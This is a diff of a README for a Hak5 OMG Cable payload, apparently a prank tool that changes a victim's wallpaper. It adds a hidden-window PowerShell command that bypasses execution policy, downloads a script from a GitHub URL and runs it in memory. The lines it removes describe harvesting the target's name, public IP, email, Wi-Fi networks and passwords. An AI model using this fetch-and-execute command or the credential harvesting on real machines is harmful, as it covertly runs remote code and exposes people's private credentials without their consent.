@@ -38,21 +38,11 @@ Image generated will be saved to desktop, steganography is used to put hidden me
 
 ### Executing program
 
-* Plug in OMG Cable
+* Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
 ```
-powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
+powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-Wallpaper-Troll/Wallpaper-Troll.ps1?dl=1?dl=1; invoke-expression $pl
 ```
-* Enumerate and get Full Name, Amount of RAM, Public IP, Wifi Password Length, Wifi Networks and Passwords, Day Password was last changed, Email
-* Custom responses have been programmed to roast the target based on the information gathered during enumeration phase 
-* Wifi Networks and passwords will be generated into an image that will be saved on the desktop
-* Image opened in notepad will reveal a hidden message at the bottom of the binary output
-* Script will freeze until a mouse movement is detected 
-* Sapi Speak will be used to speak out loud the custom responses 
-* Desktop wallpaper will be changed to the image of the targets Wifi Networks and Passwords
-* Text file will be left on the target desktop with whatever message you choose
-
-![alt text](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/OMG-AcidBurn/hacked-wallpaper.jpg)
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
@@ -61,8 +51,6 @@ powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link fo
 All contributors names will be listed here
 
 I am Jakoby
-
-Arf
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
@@ -97,7 +85,7 @@ Arf
     <img src="https://img.shields.io/badge/YouTube-I_am_Jakoby-red">
   </a>
 
-  Project Link: [https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG-AcidBurn](https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG-AcidBurn)
+  Project Link: [https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/OMG/Payloads/OMG-Wallpaper-Troll)
 </p>
 
 
@@ -109,8 +97,5 @@ Arf
 
 * [Hak5](https://hak5.org/)
 * [MG](https://github.com/OMG-MG)
-* [0iphor13](https://github.com/0iphor13)
-* [PhilSutter](https://github.com/PhilSutter)
-
 
 <p align="right">(<a href="#top">back to top</a>)</p>
